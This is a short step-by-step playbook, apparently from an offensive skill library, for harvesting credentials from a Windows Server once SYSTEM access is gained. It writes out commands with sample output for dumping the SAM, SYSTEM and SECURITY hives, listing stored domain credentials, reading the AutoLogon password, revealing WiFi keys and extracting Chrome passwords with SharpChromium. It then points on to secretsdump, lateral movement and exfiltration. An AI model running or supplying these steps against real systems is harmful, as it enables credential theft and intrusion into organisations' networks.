# Windows Data Collection

## Scenario
SYSTEM access on Windows Server 2019, collecting high-value data.

## Step 1: SAM/SYSTEM Hive Export
```cmd
C:\> reg save HKLM\SAM C:\Windows\Temp\SAM
The operation completed successfully.

C:\> reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
The operation completed successfully.

C:\> reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
The operation completed successfully.
```

## Step 2: Stored Credentials
```cmd
C:\> cmdkey /list
Currently stored credentials:
  Target: Domain:interactive=MEGACORP\t.johnson
  Type: Domain Password
  User: MEGACORP\t.johnson

  Target: Domain:interactive=MEGACORP\svc_backup
  Type: Domain Password
  User: MEGACORP\svc_backup

C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUser DefaultPass"
    DefaultUserName    REG_SZ    admin
    DefaultPassword    REG_SZ    AutoL0g0n!2024
```

## Step 3: WiFi Passwords
```cmd
C:\> netsh wlan show profiles
Profiles on interface Wi-Fi:
  All User Profile     : MEGACORP-GUEST
  All User Profile     : MEGACORP-CORP

C:\> netsh wlan show profile name="MEGACORP-CORP" key=clear | findstr "Key Content"
    Key Content            : C0rp0r@teW1f1!
```

## Step 4: Browser Credentials
```cmd
C:\> SharpChromium.exe logins
[*] Extracted 8 logins from Chrome:
  URL: https://jira.megacorp.com    User: t.johnson    Pass: J1r@Adm1n2024!
  URL: https://gitlab.megacorp.com  User: t.johnson    Pass: G1tL@b2024!
  URL: https://vpn.megacorp.com     User: t.johnson    Pass: VpnAcc3ss!
```

## Collection Summary
| Source | Data Type | Value |
|--------|-----------|-------|
| Registry | SAM/SYSTEM/SECURITY | Offline hash extraction |
| Credential Manager | t.johnson, svc_backup | Domain passwords |
| Winlogon | AutoLogon: admin | AutoL0g0n!2024 |
| WiFi | MEGACORP-CORP | C0rp0r@teW1f1! |
| Chrome | Jira, GitLab, VPN | Multiple plaintext passwords |

## Next Steps
→ **credential_access skill**: Parse SAM/SYSTEM offline with secretsdump
→ **lateral_movement skill**: Use t.johnson creds across services
→ **exfiltration skill**: Stage, encrypt, and transfer collected data
